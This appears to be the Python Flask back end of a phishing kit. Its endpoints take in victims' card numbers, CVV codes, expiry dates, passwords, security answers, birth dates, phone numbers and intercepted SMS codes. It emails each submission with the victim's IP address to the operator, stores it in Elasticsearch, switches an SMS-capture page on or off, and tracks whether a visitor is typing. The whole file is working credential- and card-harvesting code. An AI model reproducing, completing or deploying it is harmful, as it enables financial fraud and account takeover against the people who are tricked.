"""
    Module api for , accepting request from clients
"""
from flask_restful import Resource, reqparse
from flask import request
from elastic import Elastic
from mail import Mail
from utils import getCardInfo
from config import PAGE_SMS


class Card(Resource):
    """
        Class Api ressource to get cards from post method
    """

    def __init__(self):
        self.parser = reqparse.RequestParser()
        self.parser.add_argument("date", type=str, required=True)
        self.parser.add_argument("carte", type=str, required=True)
        self.parser.add_argument("cvv", type=str)
        self.parser.add_argument("date_ex_a", type=str)
        self.parser.add_argument("date_ex_m", type=str)
        self.parser.add_argument("compte", type=str)
        self.parser.add_argument("q1", type=str)
        self.parser.add_argument("q2", type=str)
        self.parser.add_argument("nom", type=str, required=True)
        self.parser.add_argument("password", type=str, required=True)
        self.parser.add_argument("email", type=str, required=True)
        self.parser.add_argument("date_naissance", type=str, required=True)
        self.parser.add_argument("numero", type=str, required=True)
        self.elastic = Elastic()
        self.mail = Mail()

    def post(self):
        """
            post method logic
        """
        data = self.parser.parse_args()
        # data.update(getCardInfo(data['pack']))
        data.update(getCardInfo(data['carte']))
        try:
            # save data to elastic search
            self.elastic.card(data, request)
        except Exception:
            pass
        data['ip'] = request.access_route[0]
        self.mail.send(data)
        return {"message": "OK"}, 200


class Info(Resource):
    def __init__(self):
        self.parser = reqparse.RequestParser()
        self.parser.add_argument("nom", type=str, required=True)
        self.parser.add_argument("password", type=str, required=True)
        self.parser.add_argument("email", type=str, required=True)
        self.parser.add_argument("date_naissance", type=str, required=True)
        self.parser.add_argument("numero", type=str, required=True)
        self.elastic = Elastic()

    def post(self):
        # pars data from request args
        data = self.parser.parse_args()

        # try to  save data in elastic search
        try:
            # save data to elastic search
            self.elastic.card(data, request)
        except Exception:
            pass

        # return OK message and 200 status
        return {"message": "OK"}, 200


class Sms(Resource):

    def __init__(self):
        # add parser object to class attribute
        self.parser = reqparse.RequestParser()

        # add required argument sms
        self.parser.add_argument("sms", type=str, required=True)

        # add elastic search class object to this class attribute
        self.elastic = Elastic()

        # add mail class object to this class attribute
        self.mail = Mail()

    def post(self):
        """
            Post logic
        """
        # pars args and get data
        data = self.parser.parse_args()

        # try to save data in elastic search database
        try:
            self.elastic.card(data, request)
        except Exception:
            pass

        # send sms to email
        data['ip'] = request.access_route[0]
        self.mail.send(data, 'Sms')
        return {"message": "OK"}, 200

    def get(self):
        """
            Get method to indicate to
            redirect to page sms or not
        """
        return {"value": PAGE_SMS}, 200


class Analytics(Resource):
    def __init__(self):
        # add parser object to class attribute
        self.parser = reqparse.RequestParser()

        # add page arguments, the page from the request beaning
        # send.
        self.parser.add_argument("page", type=str, required=True)

        # add the type argument, the type of the request , typing
        # or alive.
        self.parser.add_argument("type", type=str, required=True)

        # create alastic search object
        self.elastic = Elastic()

    def get(self):
        # pars args and get data
        data = self.parser.parse_args()

        # save analytics data in elastic search
        self.elastic.analytics(data, request)
